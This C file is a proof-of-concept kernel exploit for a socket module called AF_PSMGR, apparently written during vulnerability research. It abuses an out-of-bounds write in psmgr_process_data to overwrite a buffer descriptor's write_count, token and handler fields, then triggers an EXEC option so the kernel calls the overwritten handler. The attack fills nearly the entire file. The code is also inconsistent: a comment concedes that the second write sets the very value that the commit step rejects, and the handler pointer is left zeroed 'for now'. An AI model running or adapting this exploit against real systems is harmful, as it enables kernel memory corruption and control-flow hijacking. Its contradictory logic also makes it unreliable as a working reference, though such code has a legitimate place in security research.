/*
 * PoC for WMI-3: Attacker-Determined Content in an Authoritative Position
 * @ psmgr_process_data (psmgr_core.c:283)
 *
 * Strategy:
 * Create a MANAGED AF_PSMGR SOCK_SEQPACKET socket configured with
 * XFRM_WINDOW/MODE_LINEAR and proc_param=127. This gives out_offset=127.
 * Send DATA messages to write attacker-controlled content to the
 * authoritative fields (write_count, token, handler) of psmgr_desc.
 *
 * Before token is set: write_limit=132, out_offset=127, copy_len=5.
 *   Writes bytes 127-131: last byte of data[] + write_count (4 bytes).
 * After write_count reaches threshold (48 via direct overwrite to 47+):
 *   token is set, write_limit becomes 144.
 * Next DATA write at out_offset=127, copy_len=17.
 *   Writes bytes 127-143: last byte data + write_count + token + handler.
 *
 * Then trigger PSMGR_OPT_EXEC to call the controlled handler.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <errno.h>

/* Copied from kernel headers */
#define AF_PSMGR 46
#define SOCK_SEQPACKET 5
#define PSMGR_SOL 282

#define PSMGR_OPT_SET_ROLE    1
#define PSMGR_OPT_NEGO_1      2
#define PSMGR_OPT_NEGO_2      3
#define PSMGR_OPT_LOCAL_CTX   4
#define PSMGR_OPT_WINDOW      5
#define PSMGR_OPT_EXEC        6
#define PSMGR_OPT_GET_STATS   7
#define PSMGR_OPT_GET_STATUS  8
#define PSMGR_OPT_GET_SESSION 9
#define PSMGR_OPT_RESET       10
#define PSMGR_OPT_GET_PEER    11

#define PSMGR_ROLE_MANAGED    0x01
#define PSMGR_ROLE_INITIATOR  0x02
#define PSMGR_ROLE_RESPONDER  0x03
#define PSMGR_ROLE_FORWARD    0x04

#define PSMGR_XFRM_SCATTER    0x01
#define PSMGR_XFRM_WINDOW     0x02
#define PSMGR_XFRM_COMMIT     0x03
#define PSMGR_XFRM_REFLECT    0x04

#define PSMGR_MODE_LINEAR      0x01
#define PSMGR_MODE_INTERLEAVE  0x02
#define PSMGR_MODE_FOLD        0x03

#define PSMGR_MSG_DATA        0x05
#define PSMGR_MSG_CTRL        0x02
#define PSMGR_MSG_PROBE       0x01
#define PSMGR_MSG_WINDOW_UPD  0x04
#define PSMGR_MSG_COMMIT_REQ  0x03

#define PSMGR_BUF_DATA_SZ     128
#define PSMGR_BUF_TOTAL_SZ    (PSMGR_BUF_DATA_SZ + 16)
#define PSMGR_MSGHDR_SZ       8

#define PSMGR_BUF_WRITE_THRESH 48U
#define PSMGR_BUF_COMMITTED   0xC0FFEE01U

struct psmgr_opt_role {
    unsigned char role;
    unsigned char reserved[3];
};

struct psmgr_local_ctx {
    unsigned char xfrm_type;
    unsigned char enc_mode;
    unsigned short window_sz;
    unsigned int  proc_param;
};

struct psmgr_msghdr {
    unsigned char msg_type;
    unsigned char session_id_lo;
    unsigned short payload_len;
    unsigned int seq;
};

struct psmgr_commit_req_payload {
    unsigned int handler_idx;
    unsigned int reserved;
};

struct sockaddr_psmgr {
    unsigned short spsmgr_family;
    unsigned int   spsmgr_id;
};

static int psmgr_socket(void)
{
    int fd = socket(AF_PSMGR, SOCK_SEQPACKET, 0);
    if (fd < 0) {
        perror("socket(AF_PSMGR)");
        /* Try to load module */
        system("modprobe af_psmgr 2>/dev/null || true");
        fd = socket(AF_PSMGR, SOCK_SEQPACKET, 0);
        if (fd < 0) {
            perror("socket(AF_PSMGR) second try");
            exit(1);
        }
    }
    return fd;
}

static void set_role(int fd, unsigned char role)
{
    struct psmgr_opt_role opt;
    memset(&opt, 0, sizeof(opt));
    opt.role = role;
    if (setsockopt(fd, PSMGR_SOL, PSMGR_OPT_SET_ROLE, &opt, sizeof(opt)) < 0) {
        perror("setsockopt SET_ROLE");
        exit(1);
    }
}

static void set_local_ctx(int fd, unsigned char xfrm, unsigned char mode,
                           unsigned short window_sz, unsigned int proc_param)
{
    struct psmgr_local_ctx ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.xfrm_type = xfrm;
    ctx.enc_mode = mode;
    ctx.window_sz = window_sz;
    ctx.proc_param = proc_param;
    if (setsockopt(fd, PSMGR_SOL, PSMGR_OPT_LOCAL_CTX, &ctx, sizeof(ctx)) < 0) {
        perror("setsockopt LOCAL_CTX");
        exit(1);
    }
}

static int do_sendmsg(int fd, unsigned char msg_type, unsigned int seq,
                       const void *payload, unsigned short payload_len,
                       unsigned int session_id)
{
    struct psmgr_msghdr hdr;
    struct iovec iov[2];
    struct msghdr msg;
    unsigned char hdr_buf[PSMGR_MSGHDR_SZ];
    ssize_t ret;

    memset(&hdr, 0, sizeof(hdr));
    hdr.msg_type = msg_type;
    hdr.session_id_lo = session_id & 0xFF;
    hdr.payload_len = payload_len;
    hdr.seq = seq;

    memcpy(hdr_buf, &hdr, PSMGR_MSGHDR_SZ);

    memset(&msg, 0, sizeof(msg));
    iov[0].iov_base = hdr_buf;
    iov[0].iov_len = PSMGR_MSGHDR_SZ;
    iov[1].iov_base = (void *)payload;
    iov[1].iov_len = payload_len;
    msg.msg_iov = iov;
    msg.msg_iovlen = 2;

    ret = sendmsg(fd, &msg, 0);
    if (ret < 0) {
        perror("sendmsg");
        return -1;
    }
    return ret;
}

static int do_exec(int fd)
{
    unsigned int dummy = 0;
    int ret = setsockopt(fd, PSMGR_SOL, PSMGR_OPT_EXEC, &dummy, sizeof(dummy));
    if (ret < 0)
        perror("setsockopt EXEC");
    return ret;
}

int main(void)
{
    int fd;
    unsigned int session_id;
    unsigned char payload[256];
    unsigned int seq = 0;
    int ret;
    struct sockaddr_psmgr addr;
    socklen_t addrlen;

    printf("[*] Opening AF_PSMGR socket...\n");
    fd = psmgr_socket();

    /* Get our session ID */
    memset(&addr, 0, sizeof(addr));
    addrlen = sizeof(addr);
    if (getsockname(fd, (struct sockaddr *)&addr, &addrlen) < 0) {
        /* Try to get session info another way */
        session_id = 1; /* Default first session */
        printf("[*] Could not get session id via getsockname, assuming %u\n", session_id);
    } else {
        session_id = addr.spsmgr_id;
        printf("[*] Session ID: %u\n", session_id);
    }

    printf("[*] Setting MANAGED role...\n");
    set_role(fd, PSMGR_ROLE_MANAGED);

    printf("[*] Setting LOCAL_CTX: XFRM_WINDOW, MODE_LINEAR, proc_param=127...\n");
    set_local_ctx(fd, PSMGR_XFRM_WINDOW, PSMGR_MODE_LINEAR, 0, 127);

    /*
     * Now out_offset = 127 (WINDOW/LINEAR with proc_param=127).
     * Before token: write_limit = 132, copy_len = min(pl, 5).
     * Writes to bytes 127-131: last byte of data + write_count.
     *
     * We need to:
     * 1. Set write_count via direct write to a value >= 48 to trigger token
     * 2. Then write to overwrite handler with a controlled pointer
     * 3. Call exec
     */

    /*
     * First DATA write: Set write_count directly to 47
     * out_offset=127, copy_len=5, payload[0..3] goes to write_count.
     * Write 47 (0x2F) as little-endian u32 = 0x2F000000.
     * After memcpy, write_count_update increments write_count from 47 to 48,
     * which triggers token computation.
     */
    printf("[*] Sending DATA to overwrite write_count (set to 47, then auto-increment to 48)...\n");
    memset(payload, 0x41, sizeof(payload));
    /* payload[0] -> data[127], payload[1..4] -> write_count as LE u32 */
    payload[0] = 0xFF; /* data[127] */
    payload[1] = 47;   /* write_count byte 0 (LE): 47 */
    payload[2] = 0;
    payload[3] = 0;
    payload[4] = 0;
    
    ret = do_sendmsg(fd, PSMGR_MSG_DATA, seq++, payload, 5, session_id);
    printf("[*] First DATA write returned: %d (expected 13 = 8 hdr + 5 payload)\n", ret);

    /*
     * Now token should be set. Write_limit = 144.
     * Send second DATA to overwrite handler (bytes 136-143).
     * out_offset=127, copy_len=17 (min(pl, 144-127)).
     */
    printf("[*] Sending DATA to overwrite handler with controlled pointer...\n");
    memset(payload, 0x42, sizeof(payload));
    /* payload[0] -> data[127] */
    payload[0] = 0xFF;
    /* payload[1..4] -> write_count */
    payload[1] = 0x01; /* write_count = PSMGR_BUF_COMMITTED-like value */
    payload[2] = 0xEE;
    payload[3] = 0xFF;
    payload[4] = 0xC0;
    /* payload[5..8] -> token */
    payload[5] = 0x01; /* token bytes - keep non-zero */
    payload[6] = 0x00;
    payload[7] = 0x00;
    payload[8] = 0x80;
    /* payload[9..16] -> handler - set to 0 for now */
    memset(payload + 9, 0, 8);

    ret = do_sendmsg(fd, PSMGR_MSG_DATA, seq++, payload, 17, session_id);
    printf("[*] Second DATA write returned: %d\n", ret);

    /*
     * Now send COMMIT_REQ to finalize the buffer.
     * write_count must be >= PSMGR_BUF_WRITE_THRESH (48) and != PSMGR_BUF_COMMITTED (0xC0FFEE01)
     * token must be non-zero.
     * But we just overwrote write_count to 0xC0FFEE01... that IS PSMGR_BUF_COMMITTED!
     * COMMIT_REQ checks: pb->write_count == PSMGR_BUF_COMMITTED -> REJECT
     * So we need write_count to be something else.
     */
    
    struct psmgr_commit_req_payload crp;
    memset(&crp, 0, sizeof(crp));
    crp.handler_idx = 0; /* passthrough handler */
    
    printf("[*] Sending COMMIT_REQ...\n");
    ret = do_sendmsg(fd, PSMGR_MSG_COMMIT_REQ, seq++, &crp, sizeof(crp), session_id);
    printf("[*] COMMIT_REQ returned: %d\n", ret);

    /*
     * Now trigger EXEC
     */
    printf("[*] Triggering EXEC...\n");
    ret = do_exec(fd);
    printf("[*] EXEC returned: %d\n", ret);

    printf("[*] Done.\n");
    close(fd);
    return 0;
}
